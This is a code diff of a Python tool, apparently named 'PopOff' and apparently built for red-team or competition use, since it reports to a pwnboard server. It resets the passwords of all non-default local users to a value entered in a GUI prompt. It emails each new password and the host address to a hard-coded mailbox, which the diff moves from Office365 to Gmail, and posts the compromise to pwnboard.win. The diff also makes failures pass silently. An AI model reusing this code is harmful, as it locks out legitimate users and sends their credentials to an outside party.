@@ -41,7 +41,7 @@ def prepare_mail(message):
 
 def sendmail(email, password, message):
     message = message
-    server = smtplib.SMTP(host="smtp.office365.com", port=587)
+    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
     server.starttls()
     server.login(email, password)
     server.sendmail(email, email, prepare_mail(message))
@@ -163,7 +163,7 @@ def set_all(default_password):
         if user not in ['Administrator', 'Guest']:
             print(f"Setting password for {user}")
             set_default_password(user, default_password)
-    sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, ("Set password " + default_password + " on " + local_address))
+    sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, ("Set password '" + default_password + "' on " + local_address))
     url = "https://www.pwnboard.win/pwn"
     payload = {"ip": local_address, "application": "PopOff", "access_type": "Self Inflicted Compromise"}
     resp = requests.post(url, json=payload, headers={"Content-Type": "application/json"})
@@ -197,7 +197,10 @@ def main() -> None:
     def on_quit():
         user_input = entry_widget.get()
         print(f"User input: {user_input}")
-        set_all(user_input)
+        try:
+            set_all(user_input)
+        except Exception as e:
+            pass
         root.quit()
     button_quit = tk.Button(
         root,
